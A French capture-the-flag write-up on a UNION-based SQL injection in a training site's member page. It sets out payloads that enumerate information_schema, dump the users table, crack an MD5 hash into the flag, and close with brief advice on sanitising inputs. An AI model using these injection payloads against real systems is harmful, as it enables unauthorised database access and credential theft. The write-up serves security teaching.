# SQL Injection

## URL
/index.php?page=member

## Reproduire la faille
On nous demande d'entrer un identifiant numérique qui correspond à l'ID d'un membre.

on teste avec 5 :
```SQL
ID: 5
First name: Flag
Surname : GetThe
```
On a des erreurs provenant directement de la base de données et on voit qu'on est sur une base MariaDB.
On sait qu’il y a au moins une table avec les colonnes ID, First name, Surname.
On doit maintenant réussir à trouver les colonnes qui nous intéressent.
On sait que MariaDB a une table information_schema par défaut parce qu’on s’est bien documentés.

En cherchant ainsi :
Avec `OR` on obtient le nombre de colonnes qu'on essaie de trouver : `1 OR 1=1 UNION SELECT NULL, NULL from information_schema.columns;`
comme l’input attend un INTEGER et que nous on veut lui donner une requête SQL, on le “brain” avec cette comparaison logique au début de la requête,
Il prend en compte car c’est une valeur numérique, comme ça on peut lui balancer notre requête ensuite. On essaie ça pour avoir les colonnes d’une potentielle table users :

Requête :
```SQL
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
```

Réponse :
```SQL
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : user_id
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : first_name
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : last_name
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : town
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : country
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : planet
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : Commentaire
ID: 1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
First name: users
Surname : countersign
```

Maintenant qu’on a les colonnes on veut afficher leur contenu.
attention, UNION demande que dans les deux requêtes il y ait le même nombre de résultat donc on va utiliser SQL CONCAT() pour retourner deux résultats :

Requête :
```SQL
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

Réponse :
```SQL
ID: 1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
First name: 1
Surname : onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9
ID: 1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
First name: 2
Surname : twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10
ID: 1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
First name: 3
Surname : threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d
ID: 1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
First name: 5
Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

## Comment se protéger :
Nettoyer les inputs provenant des utilisateurs et préparer les requêtes en avance dans le backend avec des ORM comme Hibernate pour Java ou Doctrine pour PHP par exemple.

## Déchiffrer le flag

Et voilà on a la méthode pour trouver le flag:
déchiffrement de `5ff9d0165b4f92b14994e5c685cdce28` qui était chiffré en MD5 → **FortyTwo**
lower all the char (comme indiqué)
chiffrement de `fortytwo` en SHA256→ `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

